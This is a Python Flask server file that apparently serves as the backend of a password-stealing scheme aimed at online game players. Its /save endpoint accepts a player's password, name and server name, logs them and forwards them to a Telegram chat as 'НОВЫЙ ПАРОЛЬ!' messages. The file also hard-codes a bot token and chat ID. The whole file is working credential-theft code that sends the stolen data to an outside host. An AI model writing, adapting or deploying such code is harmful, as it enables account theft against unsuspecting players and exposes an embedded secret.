from flask import Flask, request
import requests
from datetime import datetime
import os

app = Flask(__name__)

BOT_TOKEN = "8502779867:AAEYF9QFrJQuwzu6IMOovE0HYKusIzsknuU"
CHAT_ID = "8502779867"

@app.route('/save', methods=['GET', 'POST'])
def save_password():
    if request.method == 'POST':
        password = request.form.get('password', '')
        name = request.form.get('name', 'Unknown')
        server = request.form.get('server', 'Unknown')
    else:
        password = request.args.get('password', '')
        name = request.args.get('name', 'Unknown')
        server = request.args.get('server', 'Unknown')
    
    print(f"Получен пароль: {password} | Игрок: {name} | Сервер: {server}")
    
    if password:
        message = f"🔑 НОВЫЙ ПАРОЛЬ!\n\n👤 Игрок: {name}\n🌐 Сервер: {server}\n🔐 Пароль: {password}\n🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        tg_data = {
            "chat_id": CHAT_ID,
            "text": message
        }
        
        try:
            response = requests.post(tg_url, data=tg_data, timeout=10)
            if response.status_code == 200:
                return "OK", 200
            else:
                return f"TG Error: {response.status_code}", 500
        except Exception as e:
            return f"Error: {str(e)}", 500
    
    return "No password", 400

@app.route('/')
def index():
    return "Mansory Bot is running!"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
